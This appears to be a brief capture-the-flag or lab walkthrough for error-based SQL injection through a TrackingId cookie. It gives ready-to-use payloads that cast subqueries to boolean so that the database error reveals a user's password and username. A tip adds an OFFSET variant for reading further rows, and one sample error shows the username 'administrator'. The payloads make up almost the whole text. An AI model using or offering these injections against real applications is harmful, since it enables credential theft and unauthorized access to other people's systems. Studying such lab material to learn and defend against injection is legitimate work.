# Step 1 :

Cookie: TrackingId=' and CAST((SELECT password FROM users LIMIT 1) AS bool) --

#this will print password for first user from the table, so check he is administrator or not.

# Step 2:

Cookie: TrackingId=' and CAST((SELECT username FROM users LIMIT 1) AS bool) --

ERROR: invalid input syntax for type boolean: "administrator"

So, the first user is administrator.



Tip:- 

If there is another user in the first row, then we need to use offset. (The 'OFFSET' value signifies the number of rows to be skipped)

Cookie: TrackingId=' and CAST((SELECT password FROM users LIMIT 1 offset 1) AS bool) --

[offset 1 means it will skip the first row and print second row.]
